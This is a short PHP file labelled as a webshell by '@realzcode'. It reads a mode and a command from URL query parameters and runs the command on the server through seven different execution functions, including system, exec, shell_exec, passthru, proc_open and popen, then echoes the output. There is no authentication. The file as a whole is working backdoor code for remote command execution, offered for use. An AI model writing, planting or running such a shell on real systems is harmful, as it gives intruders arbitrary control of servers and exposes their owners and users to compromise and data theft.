<?php 
/* Webshell 
 * ----------
 * By @realzcode
 */
switch (@$_GET['m']) {
	case 'r':
		echo `$_GET[x]`;
		break;
	case 'e':
		echo system($_GET["x"]);
		break;
	case 'a':
		echo exec($_GET["x"]);
		break;
	case 'l':
		echo shell_exec($_GET["x"]);
		break;
	case 'z':
		echo passthru($_GET["x"]);
		break;
	case 'c':
		$x = array(
			0 => array("pipe", "r"), 
			1 => array("pipe", "w"), 
			2 => array("file", "php://temp", "a") 
		); 
		$y = proc_open($_GET["x"], $x, $z); 
		if (is_resource($y)) { 
			fclose($z[0]); 
			while (!feof($z[1])) { 
				echo fgets($z[1], 1024);
			}
			fclose($z[1]); 
			$c = proc_close($y);
		}
		break;
	case 'o':
		$x = popen($_GET["x"], "r"); 
		$y = fread($x, 2096); 
		echo $y; 
		pclose($x); 
		break;
	default:
		echo "* Webshell by Realzcode * [?m=r&x=ver]";
		break;
}
?>